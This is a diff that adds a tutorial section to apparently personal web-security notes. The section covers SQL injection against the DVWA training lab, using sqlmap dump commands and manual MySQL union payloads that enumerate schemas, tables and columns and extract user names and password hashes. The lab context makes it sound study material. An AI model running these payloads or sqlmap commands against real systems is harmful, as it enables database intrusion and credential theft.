@@ -132,6 +132,210 @@ Vulnerable parts include:
      Any other data entry and saving fields
      Website links
 It is important to note that while testing against this attack, it is not enough to check only one or a few fields. It is quite common, that one field may be protected against SQL Injection, but then another does not. Therefore it is important not to forget to test all the website’s field
+
+  ###  testing SQL injection
+
+
+#### USING SQLMAP (AUTOMATED)
+Also you can try SQLMAP in DVWA SQL INJECTION, it works just fine
+
+
+  I did with sqlmap too but with use of burp suite
+
+
+  where by you intercept message after try with to put any value in that website(for this it was id so i put 1)
+  Then you save the request from burpsuite
+
+  After that, you run sqlmap to test for it If it works
+
+             sqlmap -r dvwa.sql
+
+             It works for sqlmap
+
+
+
+   Enumerate databases 
+
+            sqlmap -r dvwa.sql --dbs
+
+   We have two database which are dvwa and information_schema
+
+   Enumerate tables
+
+     -D for specification of database "dvwa"
+     --tables looking for tables in database "dvwa"
+
+                sqlmap -r dvwa.sql -D dvwa --tables
+
+                 We have two tables which are guestbook && users
+
+   Enumerate columns
+
+               -D for specification of database "dvwa"
+               -T for specification of table "users"
+               --columns looking for columns in table "users" from database "dvwa"
+
+                 sqlmap -r dvwa.sql -D dvwa -T users --columns
+
+                     we find many columns but interest columns are user and password
+
+   Retrieve data 
+
+                  -D for specification of database "dvwa"
+                  -T for specification of table "users"
+                  -C for specification of columns "user" and password(interest columns)
+                  --dump this enable us to see contents from user && password from table "users" in database "dvwa"
+
+                           sqlmap -r dvwa.sql -D dvwa -T users -C user,password --dump
+
+
+
+
+ ####  MANUAL--SQL-INJECTION: in MYSQL 
+ 
+First you test if sql injection exist in a site
+     
+To test that you must ask yourself if what website is doing from where you want to inject a sql command, it interact with database
+
+  If it interact with database, you are good to go && if not,bad luck for sql injection
+
+Check if sql injection exist in that function of website
+
+  NOTE: sql injection exist if that website did not not use  Parameterized Queries (aka Prepared Statements). Means concatenating user input with the query being executed.
+  Example
+    
+    $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+               
+
+
+  To check for SQL injection, test by `' or "` characters and chech for any errors if any
+
+  if it bring you are good to go && if it does not, no luck && try to do more bypass restriction if you are sure that website, it has sql injection
+
+Next stage try to find out what kind of database the webisite operate
+
+                   
+            ###For this I will show for Mysql
+      
+After that, what kind of injection that database we can retrieve data from database
+
+Also if there some restriction in case of , and other characters, try to bypass them with
+
+GITHUB PAGE FOR SQL INJECTION AND EVEN BYPASS: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection
+
+    Example:
+
+
+     DVWA SQL INJECTION security: low
+
+
+     first test for ' #SUCCESS FOR SQL INJECTION-- since it bring error && luck for us it bring error of Mysql
+
+Practise:
+i.  testing
+
+    'test'test';  notes the error if it is error based
+   
+ii.  Enumerate information retrival 
+
+     'test' or '1'='1';
+     
+iii.  Enumerate database version 
+
+    test' union select 1,@@version #
+   
+iv. Enumerate database names
+
+    ' union select null,schema_name from information_schema.schemata #
+
+v.  Enumerate tables on database found above
+
+      ' union select null,table_name from information_schema.tables where table_schema = 'dvwa' #
+vi.  Enumerating columnsnames in the table identified above
+ 
+        
+     ' union select 1,column_name from information_schema.columns where table_name = 'users' #
+ vii. Retriving data from the columns of tables identofied above
+  
+        ' union select user,password from users #
+
+viii. Cracking hashes if found in the tables above
+
+   second the database explain in first error with this `'` in which is mysql
+
+   third we have to find what kind of injection we can do to Mysql
+
+   Let us start with "order by" to what number of columns database has 
+
+                1. ' order by 1-- -   No error for this
+                2. ' order by 2-- -   Also No error
+                3. ' order by 3-- -   We get error that "Unknown column '3' in 'order clause'" ,you might get different error
+
+ From error, we know that there are two columns
+
+ After let us try union select
+
+ since we know there are two column let us check for those two
+
+                1. ' union select 1,2-- -
+It works by bring data from the column that has effect from sql injection
+       From here, it bring 1 && 2 columns that has effect for sql injection
+
+More verification, let us try if we can change value by using union injection
+
+                      1. ' union select "blackninja23","Hack"-- -
+We overide the value for those columns both 1 && 2 so both has sql injection error
+
+Let retrieve data from database from those affected columns 1&&2
+ 1.Let us know the user of this database from either 1 or 2 columns since there are both affected columns
+
+Using 
+
+       ' union select (user()),(user())-- -
+    
+                        the user is dvwa@localhost
+  2.Check for name of database
+
+                    i.  Using ' union select (select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),2-- -
+                    ii. ‘ UNION ALL SELECT NULL,concat(schema_name),NULL,NULL FROM information_schema.schemata#
+
+
+where by group_concat will help us to merge data since there are many data from different columns
+
+We have information_schema && dvwa----database name
+
+                     Try to separate data we try separator if it works
+
+                              Using ' union select (select group_concat(SCHEMA_NAME SEPARATOR '\n') from INFORMATION_SCHEMA.SCHEMATA),2-- -
+
+                              I works
+
+3.Check for tables in database "dvwa"
+
+                           Using ' union select (select group_concat(TABLE_NAME SEPARATOR '\n') from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = 'dvwa'),2-- -
+
+
+ 4. Check for columns for their respective tables
+
+                            ' union select (select group_concat(TABLE_NAME ,":", COLUMN_NAME SEPARATOR '\n')from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'dvwa'),2-- -
+
+
+                                 we have interest informations for users-- user && password
+
+ 5. Retrieve data "user "&&"password" from table "users" from database "dvwa"
+
+                        Notes that in here we use their value to extract data from databases
+                        we specify columns for user && password from database "dvwa" in table "users"
+
+                                ' union select (select group_concat(user," ",password SEPARATOR '\n')from dvwa.users),2-- -
+
+                        We have successful retrieve name for users and their password
+
+                           For more information of users
+
+
+                               ' union select (select group_concat(user," ",password," ",first_name," ",last_name SEPARATOR '\n')from dvwa.users),2-- -
+  
  ## 4. OS Command Injection
  
   Executing os specific commands
